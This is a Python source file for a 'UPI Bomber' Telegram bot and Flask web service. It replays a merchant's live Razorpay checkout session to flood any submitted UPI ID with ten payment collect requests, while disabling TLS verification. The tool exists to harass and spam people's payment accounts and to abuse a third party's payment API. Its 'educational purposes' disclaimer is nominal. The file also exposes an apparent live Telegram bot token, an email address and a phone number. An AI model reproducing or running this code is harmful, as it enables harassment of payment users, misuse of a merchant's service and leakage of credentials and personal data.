import os
import logging
import requests
import json
import urllib.parse
import re
import time
import threading
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration - CHANGE THESE
TOKEN = "8671717333:AAH0qX8O6Bg-7NLv9HUWLvsVrMB_s8dJI28"
CHANNEL_USERNAME = "hemantscripts"  # Your channel

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------- TELEGRAM BOT HANDLERS ----------
def is_user_in_channel(user_id, context):
    """Check if user is a member of the channel"""
    try:
        chat_member = context.bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    
    if not is_user_in_channel(user_id, context):
        keyboard = [
            [InlineKeyboardButton("📢 Join @hemantscripts", url=f"https://t.me/{CHANNEL_USERNAME}")],
            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"👋 Hello {user_name}!\n\n"
            "❌ **You must join our channel to use this bot!**\n\n"
            "👉 Please join @hemantscripts and click 'I've Joined' button.\n\n"
            "⚠️ **Why join?**\n"
            "• Get latest updates\n"
            "• Exclusive content\n"
            "• Support & help",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        return
    
    await update.message.reply_text(
        f"✅ Welcome {user_name}!\n\n"
        "💳 **UPI Bomber Bot**\n\n"
        "Send me any UPI ID (e.g., example@upi) and I'll send 10 payment requests!\n\n"
        "⚡ **Features:**\n"
        "• 10 requests per UPI\n"
        "• Fast & reliable\n"
        "• 24/7 active\n\n"
        "⚠️ Use responsibly!",
        parse_mode=ParseMode.MARKDOWN
    )

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    
    if is_user_in_channel(user_id, context):
        await query.edit_message_text(
            f"✅ **Awesome {user_name}!**\n\n"
            "You're now a member! 🎉\n\n"
            "Send me any UPI ID to start bombing:\n"
            "Example: `example@upi`",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        keyboard = [
            [InlineKeyboardButton("📢 Join @hemantscripts", url=f"https://t.me/{CHANNEL_USERNAME}")],
            [InlineKeyboardButton("🔄 Check Again", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"❌ **Still not a member!**\n\n"
            "Please join @hemantscripts and click 'Check Again' button.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

async def handle_upi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    vpa = update.message.text.strip()
    
    if not is_user_in_channel(user_id, context):
        keyboard = [
            [InlineKeyboardButton("📢 Join @hemantscripts", url=f"https://t.me/{CHANNEL_USERNAME}")],
            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "❌ **Please join our channel first!**\n\n"
            "Click the button below to join @hemantscripts:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        return
    
    if '@' not in vpa:
        await update.message.reply_text(
            "❌ **Invalid UPI ID!**\n\n"
            "Please send a valid UPI ID like:\n"
            "• `example@upi`\n"
            "• `example@paytm`\n"
            "• `example@oksbi`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    processing_msg = await update.message.reply_text(
        f"🔄 **Processing UPI:** `{vpa}`\n\n"
        "⏳ Sending 10 requests...\n"
        "Please wait a moment!",
        parse_mode=ParseMode.MARKDOWN
    )
    
    success_count, failed_count, details = perform_upi_bombing(vpa)
    
    result_text = f"""
✅ **UPI Bombing Complete!**

📌 **UPI ID:** `{vpa}`
✅ **Successful:** {success_count}
❌ **Failed:** {failed_count}
📊 **Total:** {success_count + failed_count}

📝 **Details:**
{details[:300]}

⚠️ Use responsibly!
🔗 Join: @{CHANNEL_USERNAME}
"""
    
    await processing_msg.edit_text(
        result_text,
        parse_mode=ParseMode.MARKDOWN
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📖 **UPI Bomber Bot Help**

**How to use:**
1️⃣ Join @hemantscripts
2️⃣ Send any UPI ID
3️⃣ Bot sends 10 requests

**Commands:**
/start - Start the bot
/help - Show this help
/status - Check bot status

**Example UPI IDs:**
• example@upi
• example@paytm
• example@oksbi

⚠️ **Disclaimer:**
This bot is for educational purposes only.

👑 **Channel:** @hemantscripts
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_text = """
📊 **Bot Status**

🟢 **Status:** Online
🤖 **Bot:** @UPIBomberBot
👑 **Channel:** @hemantscripts
📅 **Uptime:** 24/7
⚡ **Speed:** Fast

**Features:**
✅ Channel verification
✅ 10 requests per UPI
✅ Instant response
✅ Error handling
"""
    await update.message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)

def perform_upi_bombing(vpa):
    """Perform UPI bombing"""
    success_count = 0
    failed_count = 0
    details = []
    
    session = requests.Session()
    session.verify = False
    
    try:
        # Get session token
        api2 = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=8bffa280de336408f6c3cdfe8bc6ec534d4bddcc&build_v1=0474dadf8b040ee8ffbb695d41d925e50d30fc46&checkout_v2=1&new_session=1&rzp_device_id=1.d7f92c5a00a24a1ef65a96576d2cceb815b2b151.1771871727657.22192428&unified_session_id=SK304mkDOgbYu2"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36"
        }
        
        response = session.get(api2, headers=headers, timeout=20)
        token_match = re.search(r'window\.session_token="([^"]+)"', response.text)
        if token_match:
            token = token_match.group(1)
            details.append("✅ Session token obtained")
        else:
            details.append("⚠️ Using fallback session")
        
        # Send 10 payment requests
        for i in range(10):
            try:
                api3 = "https://api.razorpay.com/v1/payments/create/checkout?key_id=rzp_live_URBkdnF2makVoq"
                
                order_id = f"order_T5OXX3mtFlNT{i}"
                amount = 100 * (i + 1)
                
                data3 = f'description=Fabindia+Limited&currency=INR&order_id={order_id}&amount={amount}&email=chuudrihemant%40gmail.com&contact=9028382597&method=upi&save=0&customer_id=cust_T5OLk64iW8Q3d9&upi%5Bvpa%5D={urllib.parse.quote(vpa)}&upi%5Bflow%5D=collect&callback_url=https%3A%2F%2Fapi.cq6bn590y3-fabindiao1-p1-public.model-t.cc.commerce.ondemand.com%2Focc%2Fv2%2Ffabindiab2c%2Fpayment%2Frazorpay%2Fcarts%2F27508842%2Fpayment%2Fcallback%2Fchuudrihemant%40gmail.com%2F1782288011072-f75cfbc0-a33d-4e81-84a1-ed015c656caa%2FINR&key_id=rzp_live_URBkdnF2makVoq&_%5Bshield%5D%5Bfhash%5D=1cbfb0d49db2cc5005ffc2e5e8423a2cd5958a45&_%5Bdevice_id%5D=1.1cbfb0d49db2cc5005ffc2e5e8423a2cd5958a45.1782287987833.60570495&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=28022124953&_%5Bcheckout_id%5D=T5OWkM8yC8GijP'
                
                headers3 = {
                    "Host": "api.razorpay.com",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://api.razorpay.com",
                    "Referer": "https://api.razorpay.com/v1/checkout/public",
                    "Accept": "*/*"
                }
                
                payment_response = session.post(api3, data=data3, headers=headers3, timeout=20)
                
                if payment_response.status_code in [200, 201, 202]:
                    success_count += 1
                    details.append(f"✅ Request {i+1}: Success")
                else:
                    failed_count += 1
                    details.append(f"❌ Request {i+1}: Failed ({payment_response.status_code})")
                
                time.sleep(0.5)
                
            except Exception as e:
                failed_count += 1
                details.append(f"❌ Request {i+1}: Error")
        
        return success_count, failed_count, "\n".join(details)
        
    except Exception as e:
        return 0, 1, f"❌ Error: {str(e)}"

# ---------- FLASK WEB ROUTES ----------
@app.route('/')
def index():
    return render_template('index.html', channel=CHANNEL_USERNAME)

@app.route('/api/bomb', methods=['POST'])
def bomb_api():
    try:
        data = request.get_json()
        vpa = data.get('vpa', '').strip()
        
        if not vpa or '@' not in vpa:
            return jsonify({
                'success': False,
                'message': 'Invalid UPI ID. Please enter valid UPI like example@upi'
            })
        
        success_count, failed_count, details = perform_upi_bombing(vpa)
        
        return jsonify({
            'success': True,
            'vpa': vpa,
            'success_count': success_count,
            'failed_count': failed_count,
            'total': success_count + failed_count,
            'details': details.split('\n')
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error: {str(e)}'
        })

# ---------- TELEGRAM BOT THREAD ----------
def run_telegram_bot():
    try:
        request = HTTPXRequest(
            connect_timeout=60.0,
            read_timeout=60.0,
            write_timeout=60.0,
            pool_timeout=60.0,
            connection_pool_size=8,
            verify=False
        )
        
        application = Application.builder() \
            .token(TOKEN) \
            .request(request) \
            .connect_timeout(60.0) \
            .read_timeout(60.0) \
            .write_timeout(60.0) \
            .build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_upi))
        application.add_handler(CallbackQueryHandler(check_join_callback, pattern="check_join"))
        
        print("🤖 Telegram bot is running!")
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
            timeout=60
        )
        
    except Exception as e:
        print(f"❌ Telegram bot error: {e}")

# ---------- MAIN ----------
if __name__ == '__main__':
    # Start Telegram bot in background
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    
    print("🚀 UPI Bomber Web App Starting...")
    print(f"🌐 Web: http://localhost:{port}")
    print("-" * 40)
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
